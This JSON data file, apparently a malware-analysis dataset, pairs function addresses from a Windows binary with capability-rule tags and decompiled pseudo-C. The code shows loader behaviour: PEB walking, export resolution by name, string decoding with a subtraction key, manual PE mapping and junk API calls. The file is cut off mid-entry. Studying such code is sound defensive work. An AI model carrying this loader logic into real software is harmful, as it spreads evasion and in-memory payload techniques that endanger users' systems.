{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(int32_t arg_8h, ushort *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 8192 named .rsrc\n    *(arg_ch + 2) = arg_8h;\n    var_ch = 0;\n    iVar1 = var_ch;\n    do {\n        var_ch = iVar1;\n        iVar1 = var_ch + 1;\n    } while (*(arg_8h + var_ch) != '\\0');\n    arg_ch[1] = var_ch;\n    *arg_ch = var_ch;\n    return;\n}\n",
        "token_count": 164
    },
    "0040104a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040104a(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_14h == 0) {\n        iVar1 = *(arg_18h + 0x3c);\n        var_20h = 0;\n        if (iVar1 != 0) {\n            do {\n                *(arg_8h + var_20h) = *(arg_ch + var_20h);\n                var_20h = var_20h + 1;\n            } while (var_20h != iVar1);\n        }\n    }\n    iVar1 = *(arg_10h + 0x10);\n    iVar2 = *(arg_10h + 0xc);\n    iVar3 = *(arg_10h + 0x14);\n    var_24h = 0;\n    if (iVar1 != 0) {\n        do {\n            *(arg_8h + iVar2 + var_24h) = *(arg_ch + iVar3 + var_24h);\n            var_24h = var_24h + 1;\n        } while (var_24h != iVar1);\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "00401139": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401139(uint arg_8h, uint arg_ch)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_14h = *0x415da8;\n    if (*0x415da8 < 0x100) {\n        fcn.004010ed();\n        var_14h = *0x415da8;\n    }\n    var_1ch = 0;\n    *0x415da8 = var_14h;\n    if (0xff < var_14h) {\n        var_1ch = (*var_14h)(0, arg_ch, *0x415db0, arg_8h);\n    }\n    return var_1ch;\n}\n",
        "token_count": 180
    },
    "004011c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004011c0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_10h;\n    uint var_ch;\n    \n    uVar1 = arg_8h & 3;\n    if (2 < arg_ch) {\n        uVar1 = arg_8h % 0x32;\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0040141b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040141b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (arg_ch != 0) {\n        *0x415da0 = arg_8h;\n        return arg_8h != 0;\n    }\n    *0x415d90 = arg_8h;\n    return arg_8h != 0;\n}\n",
        "token_count": 105
    },
    "00401581": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401581(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x415d90 = 0;\n    *0x415da0 = 0;\n    if (arg_8h != 0) {\n        if (arg_8h == 1) {\n            *0x415d90 = 1;\n        }\n        else {\n            *0x415d90 = arg_8h;\n        }\n    }\n    if (arg_ch != 0) {\n        *0x415da0 = arg_ch + 4;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "004015f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.004015f4(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_8h = 0x3d30efd0;\n    iVar1 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n    (*_sym.imp.GDI32.dll_GetCurrentObject)(0x814b69, 0x32c);\n    var_ch = 0x8e4;\n    (*_sym.imp.KERNEL32.dll_GetNumberOfConsoleInputEvents)(0x70f152, &var_ch);\n    return iVar1 != 0;\n}\n",
        "token_count": 154
    },
    "00401653": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n\nvoid __cdecl fcn.00401653(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_9h;\n    \n    if (((arg_8h != 0 && arg_ch != 0) && (iVar1 = arg_ch + *(arg_ch + 0x3c),  *(arg_ch + *(arg_ch + 0x3c)) == 'P')) &&\n       (iVar1 != 0 && *(iVar1 + 1) == 'E')) {\n        if (*(iVar1 + 6) != 0) {\n            var_28h = iVar1 + 0x18 + *(iVar1 + 0x14);\n            var_2ch = 0;\n            do {\n                fcn.0040104a(arg_8h, arg_ch, var_28h, var_2ch, iVar1 + 0x18);\n                var_2ch = var_2ch + 1;\n                var_28h = var_28h + 0x28;\n            } while (var_2ch < *(iVar1 + 6));\n        }\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "00401a31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401a31(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 73
    },
    "00401a4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a4b(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint16_t *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    iVar4 = fcn.004021dc();\n    iVar5 = 0;\n    if (*(iVar4 + 1 + *(iVar4 + 0x3c)) == 'E') {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        var_34h = iVar4 + *(iVar4 + iVar5 + 0x24);\n        var_38h = 0;\n        do {\n            var_48h = 0;\n            do {\n                cVar1 = *(arg_8h + var_48h);\n                cVar2 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + var_38h * 4) + var_48h);\n                if (cVar2 == '\\0') break;\n                var_48h = var_48h + 1;\n            } while ((cVar2 == cVar1 && cVar1 != '\\0') && var_48h < 0x20);\n            if (cVar2 == cVar1) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *var_34h * 4);\n            }\n            var_34h = var_34h + 1;\n            var_38h = var_38h + 1;\n        } while (var_38h < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 531
    },
    "00401b8a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00401b8a(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    code *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint pszLast;\n    uint var_64h;\n    uint var_60h;\n    int16_t *var_4ch;\n    uint32_t var_48h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint32_t var_10h;\n    \n    var_10h = 0x66afdd0;\n    fcn.00402890(&var_20h);\n    var_64h = var_20h;\n    var_60h = *0x415db4;\n    var_2ch = *0x415d90;\n    var_28h = *0x415d94;\n    var_24h = *0x415d98;\n    var_30h = *0x415d9c;\n    var_34h = *0x415da0;\n    for (var_a8h = fcn.00401ea9;\n        ((var_4ch = var_a8h,  *var_a8h != 0x5a4d ||\n         (iVar3 = var_a8h + *(var_a8h + 0x3c),  *(var_a8h + *(var_a8h + 0x3c)) != 'P')) || (*(iVar3 + 1) != 'E'));\n        var_a8h = var_a8h + -0x1000 & 0xfffff000) {\n    }\n    iVar4 = 0;\n    if (*(iVar3 + 1) == 'E') {\n        iVar4 = iVar3;\n    }\n    uVar1 = *(iVar4 + 0x50);\n    var_48h = uVar1;\n    pcVar2 = fcn.004022d0(&pszLast, var_18h);\n    var_c0h = 0;\n    if (pcVar2 != NULL) {\n        uVar5 = var_10h ^ 0x66afd18;\n        if (uVar1 == (var_10h ^ 0x66afdd0)) {\n            uVar5 = 199;\n        }\n        (*pcVar2)(&pszLast);\n        iVar3 = 1;\n        if (3 < uVar1) {\n            iVar3 = 2;\n        }\n        var_c0h = iVar3 + uVar5 + 1;\n    }\n    return var_c0h;\n}\n",
        "token_count": 675
    },
    "00401d44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d44(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 0;\n    if (arg_10h != 0) {\n        do {\n            uVar1 = var_20h & 7;\n            if (var_20h < 8) {\n                uVar1 = var_20h;\n            }\n            if (arg_10h < uVar1 || 8 < uVar1) {\n                return;\n            }\n            *(arg_8h + var_20h) = *(arg_ch + var_20h) - *(uVar1 + 0x4034aa);\n            var_20h = var_20h + 1;\n        } while (var_20h < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "00401dc7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dc7(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 0;\n    var_24h = 4;\n    do {\n        for (uVar1 = *(var_20h + 0x403477); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n            uVar2 = var_24h + uVar1;\n            uVar3 = uVar1 & 3;\n            if (2 < var_24h) {\n                uVar3 = uVar1 % 0x32;\n            }\n            *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar3 + 0x403444);\n            var_24h = uVar2;\n        }\n        var_20h = var_20h + 1;\n    } while (var_24h != 0 && var_20h < 0x33);\n    return;\n}\n",
        "token_count": 340
    },
    "00401f0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401f0b(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint in_stack_ffffffe8;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00402377();\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00402a13(in_stack_ffffffe8, arg_ch);\n        bVar2 = true;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00402647();\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 164
    },
    "00401fac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401fac(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 79
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint __cdecl entry0(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint in_stack_ffffff98;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    \n    (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    fcn.004015f4();\n    fcn.004014aa();\n    (*_sym.imp.KERNEL32.dll_IsThreadAFiber)();\n    iVar1 = fcn.00401f0b(in_stack_ffffff98, _sym.imp.KERNEL32.dll_CloseHandle);\n    if (iVar1 == 0) {\n        *0x415d90 = 0;\n        *0x415da0 = NULL;\n        if ((unaff_ESI != 0) && (*0x415d90 = unaff_ESI,  unaff_ESI == 1)) {\n            *0x415d90 = 1;\n        }\n        if (*0x10 != reloc.shlwapi.dll_StrStrNIW) {\n            *0x415da0 = *0x10;\n        }\n        *0x415d94 = unaff_EDI;\n        *0x415d98 = unaff_EBX;\n        *0x415d9c = unaff_EBP;\n        fcn.00401b8a();\n        (*_sym.imp.GDI32.dll_DrawEscape)(0x50a3dc, 0xd30, 0xd30, 0x403516);\n        (*_sym.imp.KERNEL32.dll_LocalReAlloc)(0xc8406b, 0x4850a7, 0x65);\n    }\n    fcn.004012a3();\n    fcn.00401319();\n    return 0;\n}\n",
        "token_count": 609
    },
    "00402058": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402058(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_18h = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + var_18h) = *(arg_ch + var_18h);\n            var_18h = var_18h + 1;\n        } while (var_18h != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 148
    },
    "004020a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004020a4(void)\n\n{\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    int32_t var_84h;\n    uint *var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_66h;\n    uint var_1dh;\n    \n    var_7ch = &var_1dh;\n    fcn.00401d44(var_7ch, 0x403410, 0xe);\n    var_84h = 0;\n    var_80h = &var_66h;\n    do {\n        if (*var_7ch == '\\0') {\n            *var_80h = 0;\n            break;\n        }\n        *var_80h = *var_7ch;\n        var_84h = var_84h + 1;\n        var_7ch = var_7ch + 1;\n        var_80h = var_80h + 2;\n    } while (var_84h != 0x11);\n    fcn.00402436(&var_66h, 0);\n    return;\n}\n",
        "token_count": 283
    },
    "004021dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004021dc(void)\n\n{\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint *var_84h;\n    int32_t var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ah;\n    uint var_24h;\n    uint var_10h;\n    \n    var_84h = &var_24h;\n    var_10h = 0x3b3b2df6;\n    fcn.00401d44(var_84h, 0x403405, 0xb);\n    var_80h = 0;\n    var_7ch = &var_6ah;\n    do {\n        if (*var_84h == '\\0') {\n            *var_7ch = 0;\n            break;\n        }\n        *var_7ch = *var_84h;\n        var_80h = var_80h + 1;\n        var_84h = var_84h + 1;\n        var_7ch = var_7ch + 2;\n    } while (var_80h != 0x14);\n    fcn.00402436(&var_6ah, 0);\n    return;\n}\n",
        "token_count": 299
    },
    "004022d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004022d0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    arg_8h_00 = fcn.00401139(0x40, *0x415dac + -0x124);\n    var_20h = 0;\n    if (arg_8h_00 != 0) {\n        fcn.00401653(arg_8h_00, arg_ch);\n        *(arg_8h + 0x54) = arg_8h_00;\n        *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n        var_20h = arg_8h_00 + 0x2b40;\n    }\n    return var_20h;\n}\n",
        "token_count": 226
    },
    "00402377": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00402377(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar2 = fcn.004021dc();\n    iVar4 = 0;\n    if (*(iVar2 + 1 + *(iVar2 + 0x3c)) == 'E') {\n        iVar4 = iVar2 + *(iVar2 + 0x3c);\n    }\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    uVar1 = *(*(iVar2 + 0x30) + 0xa4);\n    bVar3 = true;\n    if (uVar1 != 5) {\n        bVar3 = 0x549352b9 < *(iVar4 + 8) && uVar1 < 6;\n    }\n    return bVar3;\n}\n",
        "token_count": 244
    },
    "00402436": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n\nint32_t * __cdecl fcn.00402436(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    int16_t iVar4;\n    int32_t in_FS_OFFSET;\n    bool bVar5;\n    uint var_52h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t *var_2dh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    iVar1 = *(*(iVar1 + 0x30) + 0xc);\n    piVar3 = iVar1 + 0x14;\n    unique0x00007a00 = *(iVar1 + 0x14);\n    if (unique0x00007a00 != piVar3) {\n        do {\n            if (arg_ch != NULL && stack0xffffffd0[4] == arg_ch) {\n                return stack0xffffffd0 + -2;\n            }\n            if (arg_8h != 0) {\n                var_48h = 0;\n                if (*(stack0xffffffd0 + 9) >> 1 != 0) {\n                    do {\n                        iVar4 = *(arg_8h + var_48h * 2);\n                        if (iVar4 - 0x61U < 0x1a) {\n                            iVar4 = iVar4 + -0x20;\n                        }\n                        iVar2 = *(stack0xffffffd0[10] + var_48h * 2);\n                        if (iVar2 - 0x61U < 0x1a) {\n                            iVar2 = iVar2 + -0x20;\n                        }\n                        if (iVar2 == 0) {\n                            bVar5 = iVar4 == 0;\n                            break;\n                        }\n                        bVar5 = iVar2 == iVar4;\n                        var_48h = var_48h + 1;\n                    } while (bVar5 && var_48h < *(stack0xffffffd0 + 9) >> 1);\n                    if (bVar5) {\n                        return stack0xffffffd0[4];\n                    }\n                }\n            }\n            unique0x00007a00 = *stack0xffffffd0;\n        } while (unique0x00007a00 != piVar3);\n    }\n    return NULL;\n}\n",
        "token_count": 625
    },
    "00402647": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.00402647(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t in_FS_OFFSET;\n    bool bVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_8h = 0x20db7f0e;\n    var_ch = 0;\n    iVar1 = fcn.004021dc();\n    bVar4 = false;\n    if (iVar1 != 0) {\n        iVar1 = fcn.00402436(0, iVar1);\n        pcVar2 = fcn.00401f65();\n        bVar4 = false;\n        if (pcVar2 != NULL) {\n            bVar4 = false;\n            if (**(iVar1 + 0x28) != 0) {\n                uVar3 = var_8h ^ 0x20db7f16;\n                (*pcVar2)(*(iVar1 + 0x28), &var_ch);\n                iVar1 = *(in_FS_OFFSET + uVar3);\n                if (iVar1 == 0) {\n                    iVar1 = -1;\n                }\n                bVar4 = *(iVar1 + 0x34) != 0xc1;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 349
    },
    "00402710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402710(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_eh;\n    \n    var_eh._0_2_ = 0x7a3f;\n    var_14h = 0x47142314;\n    var_20h = 0;\n    var_5ch = 0;\n    if (arg_ch != 0) {\n        fcn.00401d44(&var_44h, 0x40341e, 0x18);\n        var_1ch._0_2_ = 0x7a3f - var_eh;\n        var_18h = 0;\n        var_1ch._2_2_ = 0;\n        pcVar2 = fcn.00401a4b(&var_44h);\n        var_5ch = 0;\n        if (pcVar2 != NULL) {\n            var_18h = arg_ch;\n            var_64h = 0;\n            iVar1 = var_64h;\n            do {\n                var_64h = iVar1;\n                iVar1 = var_64h + 1;\n            } while (*(arg_ch + var_64h) != '\\0');\n            var_1ch._0_2_ = var_64h;\n            var_1ch._2_2_ = var_1ch;\n            (*pcVar2)(arg_8h, &var_1ch, 0, &var_20h);\n            var_5ch = var_20h;\n        }\n    }\n    return var_5ch;\n}\n",
        "token_count": 516
    },
    "00402aae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
